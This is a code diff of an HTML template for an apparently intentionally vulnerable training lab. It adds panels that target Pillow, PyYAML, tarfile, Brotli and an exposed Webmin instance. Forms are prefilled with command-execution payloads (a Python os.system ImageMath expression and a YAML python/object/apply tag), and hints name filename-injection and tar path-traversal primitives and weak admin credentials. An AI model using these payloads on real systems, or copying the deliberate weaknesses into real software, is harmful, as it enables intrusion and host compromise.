@@ -6,13 +6,135 @@
   <p>{{ lab.blurb }}</p>
 </header>
 
-{% if lab.slug == 'sqli-login' %}
+{% if lab.slug == 'fiu-pillow-imagemath' %}
+<section class="panel">
+  <p>Heartbeat calls <code>PIL.ImageMath.eval</code> every 60s.</p>
+  <form id="f">
+    <label>ImageMath expression</label>
+    <textarea name="math_expr" rows="3">__import__('os').system('id > /tmp/jwz-cve-2023-50447-id.txt')</textarea>
+    <button type="submit">POST /api/board/preview</button>
+  </form>
+  <pre id="out" hidden></pre>
+</section>
+<script>
+document.getElementById('f').onsubmit = async (e) => {
+  e.preventDefault();
+  const out = document.getElementById('out'); out.hidden = false; out.textContent = '…';
+  const r = await fetch('/api/board/preview', { method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ design:'hyperlite', math_expr: e.target.math_expr.value }) });
+  out.textContent = JSON.stringify(await r.json(), null, 2);
+};
+</script>
+
+{% elif lab.slug == 'fiu-pillow-jpeg' %}
+<section class="panel">
+  <p>Heartbeat runs <code>Image.thumbnail()</code> on a JPEG (ImagingJpegDecode path).</p>
+  <form id="f">
+    <label>JPEG upload</label>
+    <input type="file" name="file" accept="image/jpeg,image/*" required />
+    <button type="submit">POST /api/image/thumbnail</button>
+  </form>
+  <pre id="out" hidden></pre>
+</section>
+<script>
+document.getElementById('f').onsubmit = async (e) => {
+  e.preventDefault();
+  const out = document.getElementById('out'); out.hidden = false; out.textContent = '…';
+  const fd = new FormData(); fd.append('file', e.target.file.files[0]);
+  const r = await fetch('/api/image/thumbnail', { method:'POST', body: fd });
+  out.textContent = JSON.stringify(await r.json(), null, 2);
+};
+</script>
+
+{% elif lab.slug == 'fiu-pillow-eps' %}
+<section class="panel">
+  <p>Heartbeat opens a benign EPS (Ghostscript). Filename is the CVE-2026-112900 surface.</p>
+  <form id="f">
+    <label>Filename passed to Image.open</label>
+    <input name="filename" value="/tmp/jwz-fiu/benign.eps" style="width:100%;max-width:36rem" />
+    <p class="hint">Crafted names starting with <code>-</code> or <code>@</code> are the injection primitive.</p>
+    <button type="submit">POST /api/image/eps</button>
+  </form>
+  <pre id="out" hidden></pre>
+</section>
+<script>
+document.getElementById('f').onsubmit = async (e) => {
+  e.preventDefault();
+  const out = document.getElementById('out'); out.hidden = false; out.textContent = '…';
+  const r = await fetch('/api/image/eps', { method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ filename: e.target.filename.value }) });
+  out.textContent = JSON.stringify(await r.json(), null, 2);
+};
+</script>
+
+{% elif lab.slug == 'fiu-brotli' %}
+<section class="panel">
+  <p>Heartbeat calls <code>brotli.decompress</code> (HTTP2Shell / DecodeBlockTypeAndLength).</p>
+  <form id="f">
+    <label>Base64 Brotli payload</label>
+    <textarea name="payload_b64" rows="4" placeholder="paste base64 brotli bytes"></textarea>
+    <p class="hint">Use the benign sample from the Result panel, or a crafted HTTP2Shell stream.</p>
+    <button type="submit">POST /api/decode/brotli</button>
+  </form>
+  <pre id="out" hidden></pre>
+</section>
+<script>
+document.getElementById('f').onsubmit = async (e) => {
+  e.preventDefault();
+  const out = document.getElementById('out'); out.hidden = false; out.textContent = '…';
+  const r = await fetch('/api/decode/brotli', { method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ payload_b64: e.target.payload_b64.value }) });
+  out.textContent = JSON.stringify(await r.json(), null, 2);
+};
+</script>
+
+{% elif lab.slug == 'fiu-yaml' %}
+<section class="panel">
+  <p>Heartbeat calls <code>yaml.load(..., Loader=Loader)</code>.</p>
+  <form id="f">
+    <label>Fulfillment manifest</label>
+    <textarea name="manifest" rows="4">!!python/object/apply:os.system ['id > /tmp/jwz-cve-2020-14343-id.txt']</textarea>
+    <button type="submit">POST /api/checkout</button>
+  </form>
+  <pre id="out" hidden></pre>
+</section>
+<script>
+document.getElementById('f').onsubmit = async (e) => {
+  e.preventDefault();
+  const out = document.getElementById('out'); out.hidden = false; out.textContent = '…';
+  const r = await fetch('/api/checkout', { method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ fulfillment_manifest: e.target.manifest.value }) });
+  out.textContent = JSON.stringify(await r.json(), null, 2);
+};
+</script>
+
+{% elif lab.slug == 'fiu-tarfile' %}
+<section class="panel">
+  <p>Heartbeat extracts a benign tar via <code>TarFile.extractall</code> (no filter).</p>
+  <form id="f">
+    <label>Tar / tar.gz upload</label>
+    <input type="file" name="file" required />
+    <p class="hint">Traversal members like <code>../evil</code> are the CVE-2007-4559 story.</p>
+    <button type="submit">POST /api/archive/extract</button>
+  </form>
+  <pre id="out" hidden></pre>
+</section>
+<script>
+document.getElementById('f').onsubmit = async (e) => {
+  e.preventDefault();
+  const out = document.getElementById('out'); out.hidden = false; out.textContent = '…';
+  const fd = new FormData(); fd.append('file', e.target.file.files[0]);
+  const r = await fetch('/api/archive/extract', { method:'POST', body: fd });
+  out.textContent = JSON.stringify(await r.json(), null, 2);
+};
+</script>
+
+{% elif lab.slug == 'sqli-login' %}
 <section class="panel">
   <p>Use the <a href="/login">login form</a>. Try a normal account, then SQLi bypass.</p>
 </section>
 {% elif lab.slug == 'path-traversal' %}
 <section class="panel">
-  <h2>Vulnerable functionality</h2>
   <form method="post" action="/labs/path-traversal">
     <label>File name under public/</label>
     <input name="name" value="welcome.txt" />
@@ -22,7 +144,6 @@
 </section>
 {% elif lab.slug == 'cmd-injection' %}
 <section class="panel">
-  <h2>Vulnerable functionality</h2>
   <form method="post" action="/labs/cmd-injection">
     <label>Host to ping</label>
     <input name="host" value="127.0.0.1" />
@@ -30,26 +151,30 @@
     <button type="submit">Ping</button>
   </form>
 </section>
-{% elif lab.slug == 'yaml-deser' %}
-<section class="panel">
-  <h2>Vulnerable functionality</h2>
-  <form method="post" action="/labs/yaml-deser">
-    <label>YAML payload</label>
-    <textarea name="payload" rows="6">name: rider
-board: hyperlite</textarea>
-    <p class="hint">PyYAML &lt; 5.4 unsafe load — demo deserialization surface.</p>
-    <button type="submit">Load YAML</button>
-  </form>
-</section>
 {% elif lab.slug == 'secrets' %}
 <section class="panel">
-  <p>Demo cloud keys and DB password are injected via environment variables for secret-scanning demos.</p>
+  <p>Demo cloud keys and DB password are injected via environment variables.</p>
+</section>
+{% elif lab.slug == 'webmin' %}
+<section class="panel">
+  <h2>Exposed management plane</h2>
+  <p>
+    Lab VMs install <strong>Webmin</strong> on port <code>10000</code>, open to the world,
+    with intentional weak credentials.
+  </p>
+  <pre>URL:  https://&lt;lab2_public_ip&gt;:10000
+User: admin
+Pass: password</pre>
+  <p class="hint">
+    Terraform output <code>lab2_webmin_url</code>. Self-signed TLS — accept the browser warning.
+    After login you have sudo on the host (full compromise story).
+  </p>
 </section>
 {% endif %}
 
 {% if result %}
 <section class="panel">
-  <h2>Result</h2>
+  <h2>Result / FiU status</h2>
   <pre>{{ result | tojson(indent=2) }}</pre>
 </section>
 {% endif %}
